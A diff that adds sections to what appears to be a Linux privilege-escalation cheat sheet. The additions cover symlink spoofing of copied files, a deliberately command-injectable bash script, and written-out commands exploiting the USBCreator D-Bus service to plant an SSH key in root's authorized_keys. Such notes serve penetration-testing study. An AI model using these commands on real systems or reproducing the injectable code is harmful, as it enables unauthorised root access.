@@ -25,3 +25,44 @@ Everything to check when trying to become root
 - LinPeas
 - pspy64
 - [GTFOBins](https://gtfobins.github.io/) (online)
+
+
+# DIR / file copy (symlink)
+If there's a DIR or a file that is being copied one can either create a symlink or a direct spoof of the actual file so that the copied item will be spoofed and have the data the attacker wants.
+
+
+# Bash file command execute
+If a file executes any variable, one might be able to write payload to it.
+
+## Example
+```bash
+#!/bin/bash
+
+echo -e "Input:\t"
+read myvar
+
+/bin/bash -c $myvar
+```
+Note: Here one can insert malicious code to be executed by the program.
+
+
+# Processes / Buses
+
+## Monitor buses
+`busctl` can be used to monitor and examine the D-Bus.
+
+## Vulnerable buses
+
+### USBCreator D-Bus | com.ubuntu.USBCreator
+#### Steps to exploit
+```bash
+
+remote-machine> ps auwx | grep usb
+
+remote-machine> echo "attack-machine id_rsa.pub key" > ~/authorized_keys
+
+remote-machine> gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/remote/authorized_keys /root/.ssh/authorized_keys true
+
+attack-machine> ssh -i id_rsa root@10.10.10.10
+```
+Help: [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
